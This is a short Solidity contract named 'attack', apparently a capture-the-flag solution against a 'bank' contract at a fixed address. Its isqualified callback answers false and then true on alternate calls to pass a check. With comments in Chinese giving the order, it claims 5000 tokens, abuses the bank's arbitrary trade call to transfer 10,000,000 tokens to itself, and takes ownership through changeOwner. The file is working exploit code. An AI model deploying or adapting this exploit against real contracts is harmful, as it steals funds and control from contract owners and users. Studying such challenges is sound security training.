import "./bank.sol";
contract attack{
    check bankk=check(0x7b96aF9Bd211cBf6BA5b0dd53aa61Dc5806b6AcE);
    uint8 public number =1;
    function isqualified(uint) external returns (bool){
        if (number==1){
            number++;
            return false;
        }else{
            number--;
            return true;
        }
    }
    //先执行att1()拿到5000
    function att1() public {
       bankk.giveYou(1);
    }
    //再执行att2()
    function att2() public {
        bankk.myToken().approve(address(bankk),5000);
      bytes memory data= abi.encodeWithSignature("transfer(address,uint256)",address(this),10000000);
      bankk.trade(address(bankk.myToken()),data);
      bankk.changeOwner();
    }
}